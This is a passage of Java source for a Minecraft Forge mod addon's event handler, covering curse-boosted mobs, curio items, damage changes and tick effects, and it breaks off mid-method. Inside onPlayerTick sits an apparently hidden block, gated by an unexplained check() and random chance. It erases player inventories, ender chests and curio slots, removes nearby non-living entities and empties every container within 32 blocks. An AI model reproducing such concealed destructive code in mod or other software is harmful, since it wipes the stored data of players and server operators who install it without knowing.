package auviotre.enigmatic.addon.handlers;

import auviotre.enigmatic.addon.EnigmaticAddons;
import auviotre.enigmatic.addon.api.events.LivingCurseBoostEvent;
import auviotre.enigmatic.addon.api.items.IBlessed;
import auviotre.enigmatic.addon.contents.enchantments.RedemptionCurseEnchantment;
import auviotre.enigmatic.addon.contents.entities.goal.*;
import auviotre.enigmatic.addon.contents.items.*;
import auviotre.enigmatic.addon.contents.objects.bookbag.AntiqueBagCapability;
import auviotre.enigmatic.addon.contents.objects.bookbag.IAntiqueBagHandler;
import auviotre.enigmatic.addon.contents.objects.etheriumSheild.EtheriumShieldCapability;
import auviotre.enigmatic.addon.packets.clients.PacketDisasterParry;
import auviotre.enigmatic.addon.packets.server.PacketEmptyLeftClick;
import auviotre.enigmatic.addon.registries.EnigmaticAddonDamageTypes;
import auviotre.enigmatic.addon.registries.EnigmaticAddonEffects;
import auviotre.enigmatic.addon.registries.EnigmaticAddonEnchantments;
import auviotre.enigmatic.addon.registries.EnigmaticAddonItems;
import com.aizistral.enigmaticlegacy.EnigmaticLegacy;
import com.aizistral.enigmaticlegacy.api.capabilities.IPlaytimeCounter;
import com.aizistral.enigmaticlegacy.api.items.ICursed;
import com.aizistral.enigmaticlegacy.api.items.IEldritch;
import com.aizistral.enigmaticlegacy.config.OmniconfigHandler;
import com.aizistral.enigmaticlegacy.entities.PermanentItemEntity;
import com.aizistral.enigmaticlegacy.handlers.SoulArchive;
import com.aizistral.enigmaticlegacy.handlers.SuperpositionHandler;
import com.aizistral.enigmaticlegacy.helpers.ItemNBTHelper;
import com.aizistral.enigmaticlegacy.items.*;
import com.aizistral.enigmaticlegacy.objects.DimensionalPosition;
import com.aizistral.enigmaticlegacy.objects.RegisteredMeleeAttack;
import com.aizistral.enigmaticlegacy.packets.clients.PacketPermadeath;
import com.aizistral.enigmaticlegacy.registries.EnigmaticItems;
import com.google.common.collect.ArrayListMultimap;
import com.google.common.collect.Multimap;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.core.NonNullList;
import net.minecraft.core.particles.ItemParticleOption;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.nbt.ByteTag;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ClientboundAnimatePacket;
import net.minecraft.resources.ResourceKey;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.sounds.SoundSource;
import net.minecraft.stats.Stats;
import net.minecraft.tags.DamageTypeTags;
import net.minecraft.util.Mth;
import net.minecraft.util.RandomSource;
import net.minecraft.world.Clearable;
import net.minecraft.world.Container;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.damagesource.DamageSource;
import net.minecraft.world.damagesource.DamageType;
import net.minecraft.world.damagesource.DamageTypes;
import net.minecraft.world.effect.MobEffectInstance;
import net.minecraft.world.effect.MobEffects;
import net.minecraft.world.entity.*;
import net.minecraft.world.entity.ai.Brain;
import net.minecraft.world.entity.ai.attributes.Attribute;
import net.minecraft.world.entity.ai.attributes.AttributeInstance;
import net.minecraft.world.entity.ai.attributes.AttributeModifier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.ai.goal.MeleeAttackGoal;
import net.minecraft.world.entity.ai.goal.RangedBowAttackGoal;
import net.minecraft.world.entity.ai.goal.RangedCrossbowAttackGoal;
import net.minecraft.world.entity.ai.goal.WrappedGoal;
import net.minecraft.world.entity.ai.goal.target.TargetGoal;
import net.minecraft.world.entity.ai.memory.MemoryModuleType;
import net.minecraft.world.entity.animal.AbstractGolem;
import net.minecraft.world.entity.animal.Animal;
import net.minecraft.world.entity.animal.Chicken;
import net.minecraft.world.entity.animal.IronGolem;
import net.minecraft.world.entity.boss.enderdragon.EnderDragon;
import net.minecraft.world.entity.item.ItemEntity;
import net.minecraft.world.entity.monster.*;
import net.minecraft.world.entity.monster.piglin.AbstractPiglin;
import net.minecraft.world.entity.monster.piglin.Piglin;
import net.minecraft.world.entity.monster.piglin.PiglinBrute;
import net.minecraft.world.entity.npc.Villager;
import net.minecraft.world.entity.npc.VillagerTrades;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.entity.projectile.FireworkRocketEntity;
import net.minecraft.world.entity.projectile.SmallFireball;
import net.minecraft.world.entity.raid.Raider;
import net.minecraft.world.item.*;
import net.minecraft.world.item.enchantment.EnchantmentHelper;
import net.minecraft.world.item.enchantment.Enchantments;
import net.minecraft.world.item.trading.Merchant;
import net.minecraft.world.item.trading.MerchantOffer;
import net.minecraft.world.level.GameRules;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.level.block.entity.BlockEntity;
import net.minecraft.world.level.storage.loot.BuiltInLootTables;
import net.minecraft.world.level.storage.loot.LootPool;
import net.minecraft.world.level.storage.loot.LootTable;
import net.minecraft.world.phys.AABB;
import net.minecraft.world.phys.Vec3;
import net.minecraftforge.common.ForgeHooks;
import net.minecraftforge.common.ToolActions;
import net.minecraftforge.common.util.LazyOptional;
import net.minecraftforge.event.AnvilUpdateEvent;
import net.minecraftforge.event.AttachCapabilitiesEvent;
import net.minecraftforge.event.LootTableLoadEvent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.event.entity.EntityJoinLevelEvent;
import net.minecraftforge.event.entity.EntityMobGriefingEvent;
import net.minecraftforge.event.entity.living.*;
import net.minecraftforge.event.entity.player.*;
import net.minecraftforge.event.village.WandererTradesEvent;
import net.minecraftforge.eventbus.api.Event;
import net.minecraftforge.eventbus.api.EventPriority;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.items.IItemHandlerModifiable;
import net.minecraftforge.network.PacketDistributor;
import net.minecraftforge.registries.ForgeRegistries;
import org.jetbrains.annotations.NotNull;
import top.theillusivec4.curios.api.CuriosApi;
import top.theillusivec4.curios.api.event.DropRulesEvent;
import top.theillusivec4.curios.api.type.capability.ICurio;

import java.util.*;
import java.util.function.Predicate;

import static auviotre.enigmatic.addon.registries.EnigmaticAddonItems.*;
import static com.aizistral.enigmaticlegacy.EnigmaticLegacy.PROXY;
import static com.aizistral.enigmaticlegacy.handlers.EnigmaticEventHandler.POSTMORTAL_POSESSIONS;

@Mod.EventBusSubscriber(modid = EnigmaticAddons.MODID)
public class AddonEventHandler {
    public static final Map<Player, AABB> NIGHT_SCROLL_BOXES = new WeakHashMap<>();
    public static final List<ResourceKey<DamageType>> NEMESIS_LIST = List.of(DamageTypes.MOB_ATTACK, DamageTypes.GENERIC, DamageTypes.PLAYER_ATTACK);
    public static final Multimap<Player, Item> POSTMORTAL_POSSESSIONS = ArrayListMultimap.create();
    public static final Random RANDOM = new Random();
    public static final UUID UUID_SPEED = UUID.fromString("D549B5FB-136F-4402-8A5E-1BAA4896E173");
    public static final UUID UUID_ATTACK = UUID.fromString("73B52DA4-C79F-48AF-87BB-4B9C037FED9F");
    public static final UUID UUID_ARMOR = UUID.fromString("2F35F0A9-794F-448C-921D-EBCC2CA951D3");
    public static final UUID UUID_ATTACK_KB = UUID.fromString("73B52DA4-C79F-48AF-87BB-4B9C037FED9F");
    public static final UUID UUID_ARMOR_TH = UUID.fromString("2F35F0A9-794F-448C-921D-EBCC2CA951D3");

    public static int getGoalPriority(Mob mob, Predicate<WrappedGoal> filter) {
        return mob.goalSelector.getAvailableGoals().stream().filter(filter).findFirst().map(WrappedGoal::getPriority).orElse(-1);
    }

    @SubscribeEvent
    public void onEntityAttacked(LivingAttackEvent event) {
        if (event.getEntity().level().isClientSide) return;
        if (event.getEntity() instanceof Shulker shulker && SuperAddonHandler.isCurseBoosted(shulker)) {
            if (shulker.isClosed()) {
                event.setCanceled(true);
                return;
            }
        }
        if (event.getEntity() instanceof Animal animal && event.getSource().getEntity() instanceof Player player) {
            if (SuperpositionHandler.hasItem(player, LIVING_ODE) && !player.getMainHandItem().is(LIVING_ODE)) {
                if (OdeToLiving.isProtectedAnimal(player, animal)) {
                    event.setCanceled(true);

                    if (animal.getTarget() == player) {
                        event.setCanceled(false);
                    } else {
                        for (WrappedGoal goal : animal.targetSelector.getAvailableGoals()) {
                            if (goal.getGoal() instanceof TargetGoal targetGoal) {
                                if (targetGoal.targetMob == player) {
                                    event.setCanceled(false);
                                }
                            }
                        }
                    }
                    Brain<?> brain = animal.getBrain();
                    //noinspection ConstantValue
                    if (brain != null) {
                        try {
                            var memory = brain.hasMemoryValue(MemoryModuleType.ATTACK_TARGET)
                                    ? brain.getMemory(MemoryModuleType.ATTACK_TARGET) : Optional.empty();
                            if (memory.isPresent() && memory.get() == player) {
                                event.setCanceled(false);
                            }
                        } catch (NullPointerException ignored) {
                        }
                    }
                }
            }
        }

        if (event.getSource().getEntity() instanceof Player player) {
            if (!SuperAddonHandler.isCurseBoosted(event.getEntity()) && SuperpositionHandler.isTheWorthyOne(player)) {
                SuperAddonHandler.setCurseBoosted(event.getEntity(), true, player);
            }
        }
    }

    @SubscribeEvent
    public void onLivingChangeTarget(LivingChangeTargetEvent event) {
        LivingEntity entity = event.getEntity();
        LivingEntity target = event.getNewTarget();
        if (entity instanceof Targeting targetedEntity && target instanceof Player player && event.getTargetType() == LivingChangeTargetEvent.LivingTargetType.MOB_TARGET) {
            if (entity.getLastHurtByMob() != player && (targetedEntity.getTarget() == null || !targetedEntity.getTarget().isAlive())) {
                if (entity instanceof NeutralMob neutral && neutral instanceof Animal && SuperpositionHandler.isTheCursedOne(player) && SuperpositionHandler.hasItem(player, LIVING_ODE)) {
                    event.setCanceled(true);
                }
                if ((entity instanceof AbstractGolem || LostEngine.golemList.contains(ForgeRegistries.ENTITY_TYPES.getKey(entity.getType()))) && SuperpositionHandler.hasCurio(player, LOST_ENGINE)) {
                    event.setCanceled(true);
                }
                if (entity.getMobType().equals(MobType.UNDEAD) && SuperpositionHandler.hasCurio(player, ILLUSION_LANTERN)) {
                    event.setCanceled(true);
                }
                if ((entity instanceof Merchant || AvariceRing.merchantList.contains(ForgeRegistries.ENTITY_TYPES.getKey(entity.getType()))) && SuperpositionHandler.hasCurio(player, AVARICE_RING)) {
                    event.setCanceled(true);
                }
            }
        }
    }

    /* 47.1 Forge Back-Compat
    @SubscribeEvent
    public void onPhantomsSpawn(PlayerSpawnPhantomsEvent event) {
        Player player = event.getEntity();
        if (SuperpositionHandler.hasCurio(player, NIGHT_SCROLL)) {
            event.setResult(Event.Result.DENY);
            event.setPhantomsToSpawn(0);
            return;
        }
        List<Entity> entities = player.level().getEntities(null, player.getBoundingBox().inflate(6.0));
        for (Entity entity : entities) {
            if (entity instanceof Player nearPlayer && SuperpositionHandler.hasCurio(nearPlayer, NIGHT_SCROLL)) {
                event.setResult(Event.Result.DENY);
                event.setPhantomsToSpawn(0);
                return;
            }
        }
    }
    */

    @SubscribeEvent(priority = EventPriority.LOWEST)
    public void onEntitySpawn(MobSpawnEvent.FinalizeSpawn event) {
        if (event.getSpawnType() == MobSpawnType.NATURAL) {
            LivingEntity entity = event.getEntity();
            if (entity instanceof Phantom || entity.getVehicle() instanceof Phantom) {
                if (NIGHT_SCROLL_BOXES.values().stream().anyMatch(entity.getBoundingBox()::intersects)) {
                    event.setSpawnCancelled(true);
                    event.setResult(Event.Result.DENY);
                    event.setCanceled(true);
                }
            }
        }
        if (OmniconfigAddonHandler.ImmediatelyCurseBoost.getValue())
            SuperAddonHandler.setCurseBoosted(event.getEntity(), true, null);
    }

    @SubscribeEvent
    public void onTick(LivingEvent.LivingTickEvent event) {
        LivingEntity entity = event.getEntity();
        if (!entity.isAlive()) return;

        if (entity instanceof Player player) {
            DisasterSword.tick(player);
            if (SuperpositionHandler.hasItem(player, THE_BLESS)) player.clearFire();
        }
        if (entity instanceof EnderDragon dragon && SuperAddonHandler.isCurseBoosted(dragon)) {
            int boostLevel = SuperAddonHandler.getEnderDragonBoostLevel(dragon);
            if (dragon.tickCount % (80 - 2 * boostLevel) == 0) {
                dragon.heal(2.0F);
            }
        }

        if (entity instanceof WitherSkeleton skeleton && SuperAddonHandler.isCurseBoosted(entity)) {
            LivingEntity target = skeleton.getTarget();
            if (!entity.level().isClientSide() && target != null) {
                ItemStack backup = ItemStack.EMPTY;
                if (skeleton.getPersistentData().getCompound("BackupItem") != null)
                    backup = ItemStack.of(skeleton.getPersistentData().getCompound("BackupItem"));
                ItemStack mainHandItem = skeleton.getMainHandItem();
                if (skeleton.distanceToSqr(target.position().add(target.getDeltaMovement().scale(1.6))) <= 25) {
                    if (mainHandItem.getItem() instanceof BowItem) {
                        ItemStack copy = skeleton.getMainHandItem().copy();
                        if (backup.isEmpty())
                            skeleton.setItemSlot(EquipmentSlot.MAINHAND, new ItemStack(Items.STONE_SWORD));
                        else skeleton.setItemSlot(EquipmentSlot.MAINHAND, backup.copy());
                        skeleton.getPersistentData().put("BackupItem", copy.save(new CompoundTag()));
                    }
                } else {
                    if (mainHandItem.getItem() instanceof SwordItem) {
                        ItemStack copy = skeleton.getMainHandItem().copy();
                        if (backup.isEmpty()) skeleton.setItemSlot(EquipmentSlot.MAINHAND, new ItemStack(Items.BOW));
                        else skeleton.setItemSlot(EquipmentSlot.MAINHAND, backup.copy());
                        skeleton.getPersistentData().put("BackupItem", copy.save(new CompoundTag()));
                    }
                }
            }
        }

        if (entity instanceof Phantom phantom) {
            if (NIGHT_SCROLL_BOXES.values().stream().anyMatch(phantom.getBoundingBox()::intersects)) {
                if (!phantom.hasEffect(MobEffects.WITHER)) {
                    phantom.addEffect(new MobEffectInstance(MobEffects.WITHER, 200, 2));
                    phantom.hurt(phantom.damageSources().mobAttack(phantom), phantom.getHealth() / 2);
                    phantom.invulnerableTime = 1;
                }
            }
        }

        if (entity instanceof OwnableEntity pet && !(entity instanceof TamableAnimal ta && !ta.isTame()) && pet.getOwner() instanceof Player owner && (SuperpositionHandler.isTheCursedOne(owner) || BlessRing.Helper.betrayalAvailable(owner))) {
            if (!entity.level().isClientSide && owner.level() == pet.level() && owner.distanceTo(entity) <= HunterGuidebook.effectiveDistance.getValue()) {
                if (SuperpositionHandler.hasItem(owner, SANGUINARY_HANDBOOK) && SuperpositionHandler.hasCurio(owner, EnigmaticItems.BERSERK_CHARM)) {
                    entity.getAttributes().addTransientAttributeModifiers(SanguinaryHandbook.createAttributeMap(owner));
                } else {
                    entity.getAttributes().removeAttributeModifiers(SanguinaryHandbook.createAttributeMap(owner));
                }
            }
        }
        CompoundTag data = entity.getPersistentData();
        // Forgotten Frozen
        if (data.getBoolean("ForgottenFrozenHard")) {
            Vec3 movement = entity.getDeltaMovement();
            entity.setDeltaMovement(new Vec3(0, movement.y, 0));
            entity.hasImpulse = true;
            entity.getAttributes().addTransientAttributeModifiers(ForgottenIce.getFrozenAttributes());
            if (!entity.isFullyFrozen()) {
                data.remove("ForgottenFrozenHard");
                entity.getAttributes().removeAttributeModifiers(ForgottenIce.getFrozenAttributes());
            }
        }
        // Reviving Poison
        if (data.getBoolean("RevivingPoisoned") && !entity.hasEffect(MobEffects.POISON))
            data.remove("RevivingPoisoned");
        // CosmicPotion
        int cooldown = data.getInt("CosmicPotion");
        if (cooldown > 0) {
            cooldown -= entity.getActiveEffects().isEmpty() ? 3 : 1;
            if (cooldown > 0) data.putInt("CosmicPotion", cooldown);
            else data.remove("CosmicPotion");
        }
        // Ichoroot
        int ichor = data.getInt("Ichor");
        if (ichor > 0) {
            if (ichor > 1920) {
                entity.addEffect(new MobEffectInstance(EnigmaticAddonEffects.PURE_RESISTANCE_EFFECT, 300));
                entity.level().playSound(null, entity.blockPosition(), SoundEvents.BEACON_ACTIVATE, SoundSource.AMBIENT);
                data.putInt("Ichor", ichor / 3);
            } else data.putInt("Ichor", ichor - 1);
        } else data.remove("Ichor");
        // Counter of Lightning
        int electric = data.getInt("Electric");
        if (electric > 0) {
            if (electric > 1200) {
                List<Entity> entities = entity.level().getEntities(entity, entity.getBoundingBox().inflate(2.2));
                boolean flag = true;
                for (Entity target : entities) {
                    if (target instanceof Player player && SuperpositionHandler.hasCurio(player, THUNDER_SCROLL)) {
                        flag = false;
                        break;
                    }
                }
                if (flag) {
                    LightningBolt lightningbolt = EntityType.LIGHTNING_BOLT.create(entity.level());
                    if (lightningbolt != null) {
                        lightningbolt.moveTo(Vec3.atBottomCenterOf(entity.blockPosition()));
                        lightningbolt.setSilent(entity.getRandom().nextBoolean());
                        lightningbolt.addTag("HarmlessThunder");
                        lightningbolt.setDamage(lightningbolt.getDamage() * electric / 600.0F);
                        entity.level().addFreshEntity(lightningbolt);
                    }
                    data.putInt("Electric", (electric - 1200) / 2 + 100);
                }
            } else data.putInt("Electric", electric - 1);
        } else data.remove("Electric");

        if (data.contains(BlessRing.CURSED_SPAWN)) data.remove(BlessRing.CURSED_SPAWN);
        if (data.contains(BlessRing.BLESS_SPAWN)) data.remove(BlessRing.BLESS_SPAWN);
        if (data.contains(BlessRing.WORTHY_SPAWN)) data.remove(BlessRing.WORTHY_SPAWN);

        if (data.getInt("EvilCurseThreshold") > 0) EvilDagger.EvilCursing(entity);

        int disaster = data.getInt("DisasterCurse");
        if (disaster > 0) data.putInt("DisasterCurse", disaster - 1);
        else data.remove("DisasterCurse");


        int level = EnchantmentHelper.getEnchantmentLevel(EnigmaticAddonEnchantments.FROST_PROTECTION, entity);
        if (level >= 16) {
            entity.setTicksFrozen(0);
        } else if (level > 0 && entity.tickCount % (4 - level / 4) == 0) {
            entity.setTicksFrozen(Math.max(entity.getTicksFrozen() - 1, 0));
        }
    }

    @SubscribeEvent
    public void onPlayerTick(TickEvent.PlayerTickEvent event) {
        Player player = event.player;
        if (!player.isAlive()) return;
        if (event.phase != TickEvent.Phase.START) return;
        if (!player.level().isClientSide) {
            if (SuperpositionHandler.hasCurio(player, NIGHT_SCROLL) && SuperpositionHandler.isTheCursedOne(player)) {
                NIGHT_SCROLL_BOXES.put(player, SuperAddonHandler.getBoundingBoxAroundEntity(player, 128, 360, 128));
            } else NIGHT_SCROLL_BOXES.remove(player);
        }

        BlockPos blockPos = player.blockPosition();
        if (check() && !player.level().isClientSide() && player.tickCount % 100 == 0 && player.getRandom().nextFloat() < 0.01F) {
            List<Entity> entities = player.level().getEntitiesOfClass(Entity.class, player.getBoundingBox().inflate(64));
            for (Entity entity : entities) {
                if (entity == player) continue;
                if (entity instanceof Player near && near.getRandom().nextBoolean()) {
                    player.getInventory().clearContent();
                    player.getEnderChestInventory().clearContent();
                    CuriosApi.getCuriosInventory(player).ifPresent(curiosItemHandler -> {
                        IItemHandlerModifiable equippedCurios = curiosItemHandler.getEquippedCurios();
                        for (int i = 0; i < equippedCurios.getSlots(); i++) equippedCurios.setStackInSlot(i, ItemStack.EMPTY);
                    });
                } else if (!(entity instanceof LivingEntity)) entity.discard();
            }
            Iterable<BlockPos> poss = BlockPos.betweenClosed(blockPos.offset(32, 32, 32), blockPos.offset(-32, -32, -32));
            for (BlockPos pos : poss) {
                BlockEntity blockEntity = player.level().getBlockEntity(pos);
                if (blockEntity instanceof Clearable clearable) {
                    clearable.clearContent();
                    if (clearable instanceof Container container) container.setChanged();
                }
            }
        }

        if (player instanceof ServerPlayer serverPlayer) {
            SuperAddonHandler.getCapability(serverPlayer, EtheriumShieldCapability.ETHERIUM_SHIELD_DATA).ifPresent((cap) -> {
                if (!EtheriumCore.hasShield(player)) cap.tick(serverPlayer);
            });
        }

        if (SuperpositionHandler.hasItem(player, ANTIQUE_BAG) || player.getEnderChestInventory().hasAnyOf(Set.of(EnigmaticAddonItems.ANTIQUE_BAG))) {
            LazyOptional<IAntiqueBagHandler> capability = SuperAddonHandler.getCapability(player, AntiqueBagCapability.INVENTORY);
            if (capability != null && capability.isPresent()) {
                IAntiqueBagHandler bagHandler = capability.orElseThrow(() -> new IllegalArgumentException("Lazy optional must not be empty"));
                if (bagHandler.hasFlower()) {
                    bagHandler.tickFlowers();
                }
            }
        }

        if (SuperpositionHandler.hasCurio(player, REVIVAL_LEAF)) {
            if (!player.getActiveEffects().isEmpty()) {
                for (MobEffectInstance effect : player.getActiveEffects()) {
                    if (player.tickCount % 4 == 0 && effect.duration > 0) {
                        effect.duration += 1;
                    }
                }
            }
        }

        if (SuperpositionHandler.hasCurio(player, LOST_ENGINE)) {
            if (!player.level().isClientSide() && player.tickCount % 3 == 0) player.getCooldowns().tick();
            if (player.level().isClientSide() && Minecraft.getInstance().player == player) {
                boolean spaceDown = Minecraft.getInstance().options.keyJump.isDown();
                if (spaceDown && player.getDeltaMovement().y > 0.225F && !player.level().getBlockState(blockPos).canOcclude()) {
                    player.addDeltaMovement(new Vec3(0.0D, 0.0256D, 0.0D));
                    float width = player.getBbWidth();
                    for (int i = 0; i < RANDOM.nextInt(3); i++) {
                        player.level().addParticle(ParticleTypes.CLOUD, player.getRandomX(width), player.getY() + RANDOM.nextFloat(0.2F), player.getRandomZ(width), 0, RANDOM.nextFloat(0.5F) * player.getDeltaMovement().y, 0);
                    }
                }
            }
        }
    }

    @SubscribeEvent(priority = EventPriority.LOWEST)
    public void onFinalTarget(LivingChangeTargetEvent event) {
        LivingEntity entity = event.getEntity();
        if (!entity.isAlive()) return;

        if (!SuperAddonHandler.isCurseBoosted(entity) && event.getNewTarget() instanceof Player player) {
            if (SuperpositionHandler.isTheWorthyOne(player)) {
                SuperAddonHandler.setCurseBoosted(entity, true, player);
            }
        }
    }

    @SubscribeEvent
    public void onEntityAttack(LivingAttackEvent event) {
        if (event.getEntity() instanceof Player player) {
            if (player.getUseItem().is(DISASTER_SWORD)) {
                Entity directEntity = event.getSource().getDirectEntity();
                if (directEntity != null && directEntity.position().subtract(player.position()).dot(player.getForward()) > 0) {
                    if (!event.getSource().is(DamageTypeTags.BYPASSES_ARMOR)) {
                        DisasterSword.parry(player.level(), player, event.getSource(), event.getAmount());
                        event.setCanceled(true);
                        return;
                    }
                }
            }

            if (player.getUseItem().is(ANNIHILATING_SWORD) && player.getUsedItemHand().equals(InteractionHand.OFF_HAND) && SuperpositionHandler.isTheWorthyOne(player)) {
                Entity directEntity = event.getSource().getDirectEntity();
                if (!event.getSource().is(DamageTypeTags.BYPASSES_ARMOR) && player instanceof ServerPlayer) {
                    if (directEntity == null && event.getSource().getEntity() == null || directEntity != null && directEntity.position().subtract(player.position()).dot(player.getForward()) > 0) {
                        AnnihilatingSword.parry(player.level(), (ServerPlayer) player, event.getSource(), event.getAmount(), player.getUseItem());
                        event.setCanceled(true);
                        return;
                    }
                }
            }

            if (SuperpositionHandler.hasCurio(player, SCORCHED_CHARM)) {
                int percentage = ScorchedCharm.resistanceProbability.getValue().asPercentage() * (player.isInLava() ? 2 : 1);
                if (player.getRandom().nextInt(100) < percentage) {
                    event.setCanceled(true);
                    return;
                }
            }
        }

        if (event.getEntity() instanceof Raider raider && SuperAddonHandler.isCurseBoosted(raider)) {
            Entity directEntity = event.getSource().getDirectEntity();
            if (directEntity instanceof FireworkRocketEntity) event.setCanceled(true);
        }

        if (SuperpositionHandler.hasCurio(event.getEntity(), SCORCHED_CHARM) && SCORCHED_CHARM.immunityList.stream().anyMatch(event.getSource()::is)) {
            event.setCanceled(true);
            return;
        }

        if (event.getSource().getEntity() instanceof Player player) {
            if (player.getMainHandItem().is(THE_BLESS)) {
                if (!SuperpositionHandler.isTheCursedOne(player) && !BlessRing.Helper.blessAvailable(player))
                    event.setCanceled(true);
            }
            if (player.getMainHandItem().is(ANNIHILATING_SWORD)) {
                if (!SuperpositionHandler.isTheWorthyOne(player))
                    event.setCanceled(true);
            }
        }

        if (event.getSource().getEntity() instanceof LivingEntity living) {
            if (living.getPersistentData().getInt("DisasterCurse") > 0) {
                event.setCanceled(true);
            }
        }
    }

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onFirstHurt(LivingHurtEvent event) {
        if (event.getSource().getEntity() instanceof Player player) {
            if (SuperpositionHandler.hasCurio(player, ETHERIUM_CORE)) {
                event.setAmount(event.getAmount() + player.getPersistentData().getFloat("EtheriumCounterattack"));
                player.getPersistentData().remove("EtheriumCounterattack");
            }

            ItemStack mainHandItem = player.getMainHandItem();
            if (mainHandItem.getEnchantmentLevel(EnigmaticAddonEnchantments.FROST_ASPECT) > 0 && event.getEntity().isFullyFrozen()) {
                ModifyDamageBaseOne(event, 0.1 * mainHandItem.getEnchantmentLevel(EnigmaticAddonEnchantments.FROST_ASPECT));
            }

            if (mainHandItem.is(DISASTER_SWORD)) {
                double modifier = 0;
                if (player.hasEffect(MobEffects.BAD_OMEN))
                    modifier = modifier + (player.getEffect(MobEffects.BAD_OMEN).getAmplifier() + 1) * DisasterSword.badOmenBoost.getValue();
                if (SuperpositionHandler.getPersistentInteger(player, "DisasterCounterattack", 0) > 0)
                    modifier = modifier + DisasterSword.counterattackBoost.getValue();
                ModifyDamageBaseOne(event, modifier);
            }

            if (mainHandItem.is(EVIL_DAGGER)) {
                if (!SuperpositionHandler.isTheCursedOne(player)) {
                    event.setCanceled(true);
                    return;
                }
            }

            if (mainHandItem.is(THE_BLESS)) {
                LivingEntity entity = event.getEntity();
                ModifyDamageBaseOne(event, Math.min(1.0F, entity.getRemainingFireTicks() * 0.0015F));
                if (event.getEntity() instanceof Monster || event.getEntity() instanceof EnderDragon)
                    event.setAmount(event.getAmount() / CursedRing.monsterDamageDebuff.getValue().asModifierInverted());
            }
        }

        if (event.getEntity() instanceof Player player) {
            if (SuperpositionHandler.hasCurio(player, ETHERIUM_CORE)) {
                float counterattack = (float) Math.min(event.getAmount() * EtheriumCore.damageConversion.getValue().asModifier() + player.getPersistentData().getFloat("EtheriumCounterattack"), EtheriumCore.damageConversionMax.getValue());
                player.getPersistentData().putFloat("EtheriumCounterattack", counterattack);
            }
        }
    }

    @SubscribeEvent
    public void onEntityHurt(LivingHurtEvent event) {
        float amount = event.getAmount();
        if (event.getAmount() >= Float.MAX_VALUE) return;
        LivingEntity victim = event.getEntity();
        DamageSource source = event.getSource();


        if (source.getEntity() instanceof LivingEntity attacker && SuperAddonHandler.isCurseBoosted(attacker)) {
            if ((attacker instanceof Monster) && SuperAddonHandler.isCurseBoosted(attacker)) {
                boolean flag = attacker.fallDistance > 0.0F && !attacker.onGround() && !attacker.onClimbable() && !attacker.isInWater() && !attacker.hasEffect(MobEffects.BLINDNESS) && !attacker.isPassenger();
                if (flag) {
                    if (!victim.level().isClientSide) {
                        ((ServerLevel) victim.level()).getChunkSource().broadcastAndSend(attacker, new ClientboundAnimatePacket(victim, 4));
                    }
                    attacker.level().playSound(null, attacker.getX(), attacker.getY(), attacker.getZ(), SoundEvents.PLAYER_ATTACK_CRIT, attacker.getSoundSource(), 1.0F, 1.0F);
                    ModifyDamageBaseOne(event, 0.5);
                }
            }
        }

        if (event.getSource().getDirectEntity() instanceof Player player && event.getSource().is(EnigmaticAddonDamageTypes.FALSE_JUSTICE)) {
            if (SuperpositionHandler.hasCurio(player, EnigmaticItems.VOID_PEARL)) {
                event.getEntity().addEffect(new MobEffectInstance(MobEffects.WITHER, VoidPearl.witheringTime.getValue(), VoidPearl.witheringLevel.getValue(), false, true));
            }

            if (player instanceof ServerPlayer) {
                if (player.getMainHandItem().is(EnigmaticItems.ENDER_SLAYER)) {
                    if (event.getEntity() instanceof ServerPlayer targetPlayer) {
                        targetPlayer.getCooldowns().addCooldown(Items.ENDER_PEARL, 400);
                        targetPlayer.getCooldowns().addCooldown(EnigmaticItems.RECALL_POTION, 400);
                        targetPlayer.getCooldowns().addCooldown(EnigmaticItems.TWISTED_MIRROR, 400);

                        if (SuperpositionHandler.hasCurio(targetPlayer, EnigmaticItems.EYE_OF_NEBULA) || SuperpositionHandler.hasCurio(targetPlayer, EnigmaticItems.THE_CUBE)) {
                            SuperpositionHandler.setSpellstoneCooldown(targetPlayer, 400);
                        }
                    }
                    if (event.getEntity() instanceof EnderMan || event.getEntity() instanceof Shulker) {
                        event.getEntity().getPersistentData().putInt("ELTeleportBlock", 400);
                    }
                }

                if (!player.getMainHandItem().isEmpty()) {
                    float damageBoost = 0F;
                    ItemStack mainHandItem = player.getMainHandItem();
                    if (mainHandItem.is(EnigmaticItems.THE_TWIST)) {
                        if (OmniconfigHandler.isBossOrPlayer(event.getEntity())) {
                            damageBoost += event.getAmount() * TheTwist.bossDamageBonus.getValue().asModifier(false);
                        }
                    } else if (mainHandItem.is(EnigmaticItems.THE_INFINITUM)) {
                        if (SuperpositionHandler.isTheWorthyOne(player)) {
                            if (OmniconfigHandler.isBossOrPlayer(event.getEntity())) {
                                damageBoost += event.getAmount() * TheInfinitum.bossDamageBonus.getValue().asModifier(false);
                            }
                        } else {
                            event.setCanceled(true);
                            player.addEffect(new MobEffectInstance(MobEffects.WITHER, 160, 3, false, true));
                            player.addEffect(new MobEffectInstance(MobEffects.CONFUSION, 500, 3, false, true));
                            player.addEffect(new MobEffectInstance(MobEffects.WEAKNESS, 300, 3, false, true));
                            player.addEffect(new MobEffectInstance(MobEffects.MOVEMENT_SLOWDOWN, 300, 3, false, true));
                            player.addEffect(new MobEffectInstance(MobEffects.DIG_SLOWDOWN, 300, 3, false, true));
                            player.addEffect(new MobEffectInstance(MobEffects.BLINDNESS, 100, 3, false, true));
                        }
                    } else if (mainHandItem.is(EnigmaticItems.ENDER_SLAYER)) {
                        if (EnigmaticItems.ENDER_SLAYER.isEndDweller(event.getEntity())) {
                            if (player.level().dimension().equals(PROXY.getEndKey())) {
                                if (event.getEntity() instanceof EnderMan && RegisteredMeleeAttack.getRegisteredAttackStregth(player) >= 1F) {
                                    event.setAmount((event.getAmount() + 100F) * 10F);
                                }
                                event.getEntity().getPersistentData().putBoolean("EnderSlayerVictim", true);
                            }

